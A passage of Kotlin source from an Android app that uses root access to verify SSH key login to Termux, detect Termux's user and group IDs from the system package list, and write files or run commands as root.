                            statusMessage.appendLine("🔄 Verifying SSH connection with new key...")

                            val verifyProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", verifyPipeline))
                            val verifyOut2 = BufferedReader(InputStreamReader(verifyProc2.inputStream)).use { it.readText() }
                            verifyProc2.waitFor()

                            val verifySuccess2 = verifyOut2.contains("VERIFY:SUCCESS")
                            statusMessage.apply {
                                if (verifySuccess2) {
                                    appendLine("✅ SSH connection verified with new key - pubkey authentication now working!")
                                } else {
                                    appendLine("⚠️ SSH connection still failing with new key")
                                    appendLine("   Manual troubleshooting may be required")
                                }
                            }

                            return verifySuccess2
                        }
                    }
                    return false
                }

                return verifySuccess
            }

            return sshpassSuccess

        } catch (e: Exception) {
            statusMessage.apply {
                appendLine("")
                appendLine("❌ Exception during key transfer: ${e.message}")
            }
            return false
        }
    }

    private fun detectTermuxIds() {
        Thread {
            try {
                val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
                val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                val listExit = listProc.waitFor()

                if (listExit != 0 || listOutput.isBlank()) {
                    return@Thread
                }

                val parts = listOutput.trim().split("\\s+".toRegex())
                if (parts.size < 2) {
                    return@Thread
                }

                val termuxAppId = parts[1].toIntOrNull() ?: return@Thread

                termuxUid = termuxAppId.toString()
                termuxGid = termuxAppId.toString()

                val appId = termuxAppId - 10000
                val supplementaryGroups = listOf(
                    "3003",
                    "9997",
                    (20000 + appId).toString(),
                    (50000 + appId).toString()
                )

                termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
            } catch (e: Exception) {
            }
        }.start()
    }

    private fun ensureTermuxIdsDetected(): Pair<Boolean, String?> {
        if (termuxUid.isNotEmpty() && termuxGid.isNotEmpty() && termuxGroups.isNotEmpty()) {
            return Pair(true, null)
        }

        try {
            val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
            val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
            val listError = BufferedReader(InputStreamReader(listProc.errorStream)).use { it.readText() }
            val listExit = listProc.waitFor()

            if (listExit != 0) {
                return Pair(false, "Failed to read packages.list (exit: $listExit)\nError: $listError")
            }

            if (listOutput.isBlank()) {
                return Pair(false, "Termux not found in packages.list. Is Termux installed?")
            }

            val parts = listOutput.trim().split("\\s+".toRegex())
            if (parts.size < 2) {
                return Pair(false, "Invalid format in packages.list:\n$listOutput")
            }

            val termuxAppId = parts[1].toIntOrNull()
            if (termuxAppId == null) {
                return Pair(false, "Could not parse UID from packages.list:\n$listOutput")
            }

            termuxUid = termuxAppId.toString()
            termuxGid = termuxAppId.toString()

            val appId = termuxAppId - 10000
            val supplementaryGroups = listOf(
                "3003",
                "9997",
                (20000 + appId).toString(),
                (50000 + appId).toString()
            )

            termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }

            return Pair(true, null)

        } catch (e: Exception) {
            return Pair(false, "Exception during detection: ${e.message}\n${e.stackTraceToString()}")
        }
    }

    private fun writeFileAsRoot(path: String, content: String) {
        val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", "cat > '$path'"))
        OutputStreamWriter(proc.outputStream).use { writer ->
            writer.write(content)
            writer.flush()
        }
        proc.outputStream.close()

        val stderr = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
        val stdout = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
        val code = proc.waitFor()
        if (code != 0) throw RuntimeException("writeFileAsRoot failed ($code)\n$stderr\n$stdout")
    }

    private fun execAsRoot(cmd: String) {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", cmd))
        val err = BufferedReader(InputStreamReader(p.errorStream)).use { it.readText() }
        val out = BufferedReader(InputStreamReader(p.inputStream)).use { it.readText() }
        val code = p.waitFor()
        if (code != 0) throw RuntimeException("su -mm -c failed ($code)\n$err\n$out")
    }

    private fun executeCommand(command: String, textView: TextView) {
        Thread {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                val output = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }
                val errorOutput = BufferedReader(InputStreamReader(process.errorStream)).use { it.readText() }
                val code = process.waitFor()
                runOnUiThread {
                    textView.text = when {
                        output.isNotBlank() -> output.trim()
                        errorOutput.isNotBlank() -> "Error (exit $code):\n$errorOutput"
                        else -> "No output"
                    }
                }
            } catch (ex: Exception) {
                runOnUiThread { textView.text = "Exception: ${ex.message}" }
            }
        }.start()
    }
}
